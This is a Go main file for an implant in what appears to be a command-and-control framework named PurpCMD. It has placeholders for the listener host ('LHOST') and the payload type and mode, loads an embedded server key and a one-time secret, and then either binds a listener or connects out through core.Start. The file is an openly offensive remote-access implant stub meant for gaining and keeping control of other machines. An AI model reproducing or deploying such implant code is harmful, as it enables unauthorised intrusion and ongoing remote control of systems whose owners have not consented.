package main

import (
	"purpcmd/implant/core"
)

// Public key DER bytes - replaced during build
var publicKeyDER []byte
var implantOTS [12]byte

func main() {
	//ua := "Mozilla PurpCMD"
	//uri := "/"
	remoteAdd := "LHOST"          // Replaced
	payloadType := "IMPLANT_TYPE" // Replaced
	payloadMode := "IMPLANT_MODE" // Replaced
	//ps := "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDm7lFJASftWM9Bmw+sQnjNtr48wXhSRDf43XUhbfRBT05j5dZ4+2qUhPt5gugkECSINzOs2nGz0hkCFTGDqPIM="

	// Load the embedded server public key
	if len(publicKeyDER) > 0 {
		if err := core.SetPublicKeyDER(publicKeyDER); err != nil {
			panic(err)
		}
	}
	if err := core.SetOneTimeSecret(implantOTS[:]); err != nil {
		panic(err)
	}

	if payloadMode == "bind" {
		if err := core.StartBind(remoteAdd, payloadType); err != nil {
			panic(err)
		}
		return
	}
	core.Start(remoteAdd, payloadType)
}
